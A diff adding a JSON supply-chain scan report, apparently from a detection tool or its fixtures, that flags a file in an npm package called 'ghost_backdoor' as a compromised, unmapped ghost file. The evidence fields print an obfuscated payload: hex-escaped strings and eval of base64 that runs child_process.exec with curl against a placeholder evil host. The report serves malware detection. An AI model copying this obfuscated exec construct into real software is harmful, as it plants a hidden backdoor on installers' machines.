@@ -1,0 +1,51 @@
+{
+  "package_name": "ghost_backdoor",
+  "version": "1.0.0",
+  "ecosystem": "npm",
+  "source_ref": "upstream",
+  "archive_sha256": "e5b3068716d23b44d8040c786d93dade61517fc05b8ebaf8117178f35d37d943",
+  "provenance_verified": false,
+  "summary_counts": {
+    "identical": 2,
+    "expected_artifacts": 0,
+    "stripped_dev_files": 0,
+    "suspicious": 0,
+    "critical": 1
+  },
+  "verdict": "COMPROMISED",
+  "model_used": "deterministic-static-fallback",
+  "findings": [
+    {
+      "file_path": "lib/x.min.js",
+      "classification": "UNMAPPED_GHOST_FILE",
+      "severity": "CRITICAL",
+      "verdict": "COMPROMISED",
+      "entropy": 5.441,
+      "evidence": [
+        "No source counterpart found in upstream repository",
+        "Shannon entropy: 5.44",
+        "hex_escaped_string_array",
+        "dynamic_execution: eval(",
+        "dynamic_execution: Buffer.from('cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2N1cmwgaHR0cHM6Ly9ldmlsLmV4YW1wbGUuaW52YWxpZCcp','base64')",
+        "Sensitive capability [eval]: eval"
+      ],
+      "diff_snippet": "var _0x4f2a=['\\x63\\x68\\x69\\x6c\\x64\\x5f\\x70\\x72\\x6f\\x63\\x65\\x73\\x73','\\x65\\x78\\x65\\x63'];eval(Buffer.from('cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2N1cmwgaHR0cHM6Ly9ldmlsLmV4YW1wbGUuaW52YWxpZCcp','base64').toString());",
+      "explanation": "Ghost file 'lib/x.min.js' present in package archive with no origin in Git repository. Elevated entropy (5.44) and sensitive execution markers indicate potential backdoor injection.",
+      "archetype": "CASE_3_GHOST_OBFUSCATED",
+      "file": "lib/x.min.js",
+      "status": "UNMAPPED_GHOST_FILE",
+      "category": "ORPHAN_GHOST_FILE"
+    }
+  ],
+  "summary": {
+    "suspicious_findings": 1,
+    "expected_build_artifacts": 0,
+    "identical_files": 2,
+    "identical": 2,
+    "expected_artifacts": 0,
+    "stripped_dev_files": 0,
+    "suspicious": 0,
+    "critical": 1
+  },
+  "risk_score": 100
+}
